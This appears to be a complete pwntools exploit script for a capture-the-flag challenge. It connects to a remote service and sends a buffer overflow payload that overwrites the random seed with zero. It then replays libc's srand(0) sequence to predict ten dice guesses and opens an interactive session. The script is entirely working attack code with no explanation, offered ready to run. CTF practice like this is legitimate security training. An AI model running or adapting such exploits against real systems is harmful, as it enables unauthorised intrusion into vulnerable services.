```
from pwn import *
from ctypes import *
context.log_level = 'debug'
sh = remote('61.147.171.105',65288)
payload=b'a'*0x20+p64(0)
sh.sendlineafter('Your name:',payload)
libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
libc.srand(0)
for  i in range(10):
	sh.recvuntil("Please input your guess number:")
	num = str(libc.rand() % 6 +1)
	sh.sendline(num)
sh.interactive()
```